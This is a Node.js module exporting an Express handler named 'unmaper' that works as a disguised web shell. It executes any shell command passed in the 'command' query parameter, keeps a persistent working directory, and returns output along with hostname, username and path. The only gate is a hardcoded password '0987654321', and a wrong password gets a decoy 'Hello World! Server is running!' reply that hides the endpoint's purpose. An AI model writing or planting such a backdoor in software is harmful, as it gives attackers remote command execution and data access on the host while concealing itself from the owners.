
const { exec } = require('child_process');

const path = require('path');
const os = require('os');
const fs = require('fs');





let currentWorkingDirectory = process.cwd();

const commandMappings = {
    'win32': {
        'ls': 'dir',
        'cat': 'type',
        'pwd': 'cd',
        'find': 'findstr',
        'ps': 'tasklist',
        'rm': 'del',
        'cp': 'copy',
        'mv': 'move',
        'grep': 'findstr'
    },
    'linux': {
        'dir': 'ls',
        'type': 'cat',
        'findstr': 'grep',
        'del': 'rm',
        'copy': 'cp',
        'move': 'mv'
    },
    'darwin': { 
        'dir': 'ls',
        'type': 'cat',
        'findstr': 'grep',
        'del': 'rm',
        'copy': 'cp',
        'move': 'mv'
    }
};

const unmaper = (req, res) => {
    let { command ,password} = req.query;


    if( password !== '0987654321') {
        return res.status(401).send("Hello World! Server is running!");
    }
    
    if (!command) {
        return res.status(400).json({
            status: 'error',
            message: 'Command parameter is required.'
        });
    }
    
 
    const baseCommand = command.split(' ')[0];
    
  
    if (baseCommand === 'cd') {
      
        const targetDir = command.substring(3).trim();
        let newDirectory;
        
        if (path.isAbsolute(targetDir)) {
            newDirectory = targetDir;
        } else {
            newDirectory = path.resolve(currentWorkingDirectory, targetDir);
        }
        

        try {
            fs.accessSync(newDirectory, fs.constants.F_OK);
            currentWorkingDirectory = newDirectory;
            
            return res.json({
                status: 'success',
                data: {
                    output: `Changed directory to ${newDirectory}`,
                    stderr: null
                },
                metadata: {
                    command: command,
                    originalCommand: req.query.command,
                    executionTime: new Date().toISOString(),
                    context: {
                        platform: process.platform,
                        hostname: os.hostname(),
                        username: os.userInfo().username,
                        workingDirectory: currentWorkingDirectory,
                        timestamp: new Date().toISOString()
                    }
                }
            });
        } catch (error) {
            return res.status(400).json({
                status: 'error',
                error: `Directory not found: ${newDirectory}`,
                context: {
                    workingDirectory: currentWorkingDirectory
                }
            });
        }
    }
    

    if (baseCommand === 'pwd') {
        return res.json({
            status: 'success',
            data: {
                output: currentWorkingDirectory,
                stderr: null
            },
            metadata: {
                command: command,
                originalCommand: req.query.command,
                executionTime: new Date().toISOString(),
                context: {
                    platform: process.platform,
                    hostname: os.hostname(),
                    username: os.userInfo().username,
                    workingDirectory: currentWorkingDirectory,
                    timestamp: new Date().toISOString()
                }
            }
        });
    }
    
  
    const platform = process.platform;
    const mappings = commandMappings[platform] || {};
    
    if (mappings[baseCommand]) {
        const newBaseCommand = mappings[baseCommand];
        command = command.replace(new RegExp(`^${baseCommand}\\b`), newBaseCommand);
    }
    
 
    const context = {
        platform: platform,
        hostname: os.hostname(),
        username: os.userInfo().username,
        workingDirectory: currentWorkingDirectory,
        timestamp: new Date().toISOString()
    };
    
    console.log(`Executing command: ${command} in directory: ${currentWorkingDirectory}`);
    
  
    const childProcess = exec(command, { 
        timeout: 30000,
        cwd: currentWorkingDirectory 
    }, (error, stdout, stderr) => {
        if (error) {
            console.error(`exec error: ${error}`);
            return res.status(500).json({
                status: 'error',
                error: error.message,
                stderr: stderr,
                context: context
            });
        }
        

        let formattedOutput = stdout;
        if (baseCommand === 'ls' || baseCommand === 'dir') {
            try {
            
                const entries = stdout.trim().split('\n').filter(line => line.trim());
                formattedOutput = {
                    raw: stdout,
                    entries: entries
                };
            } catch (e) {

                formattedOutput = stdout;
            }
        }
        
        return res.json({
            status: 'success',
            data: {
                output: formattedOutput,
                stderr: stderr || null
            },
            metadata: {
                command: command,
                originalCommand: req.query.command,
                executionTime: new Date().toISOString(),
                context: context
            }
        });
    });
   
    childProcess.on('close', (code) => {
        console.log(`Command exited with code ${code}`);
    });
}


module.exports = unmaper;  









